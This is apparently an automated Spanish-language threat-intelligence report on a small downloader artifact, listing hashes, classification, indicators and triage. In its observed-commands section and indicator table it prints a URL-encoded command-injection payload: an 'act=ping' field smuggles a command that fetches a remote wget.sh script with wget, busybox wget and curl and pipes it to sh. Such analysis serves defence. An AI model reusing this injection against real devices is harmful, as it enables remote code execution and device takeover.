# 🧬 Payload Analysis

`f2a2d5b561fe55368e91547dd293838289841dd970bf3c7102a2499abc526553`

## 📌 Resumen

Artefacto identificado como ASCII text, with CRLF line terminators de 381 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:49:46.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `f2a2d5b561fe55368e91547dd293838289841dd970bf3c7102a2499abc526553`
- **SHA1:** `85d91a43b7fc9538bc6b4feadffb420d54c226cb`
- **MD5:** `468dd16f89918a67eda80b42c7af4439`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 381 B |
| Entropía | 5.21 |
| Strings | 6 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
act=ping&dst=%26%20cd%20/tmp%3Bwget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20ddiag%3Bbusybox%20wget%20http://91.9
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20ddiag%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20ddiag%3Bcurl%20http://91.92.40.XXX/wget.sh%7Csh%20-s%20ddiag%26 | strings |
| ip | 190.179.139.XXX | static_analysis |
| ip | 91.92.40.XXX | static_analysis |
| command | act=ping&dst=%26%20cd%20/tmp%3Bwget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20ddiag%3Bbusybox%20wget%20http://91.9 | strings |
| hash | f2a2d5b561fe55368e91547dd293838289841dd970bf3c7102a2499abc526553 | static_analysis |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
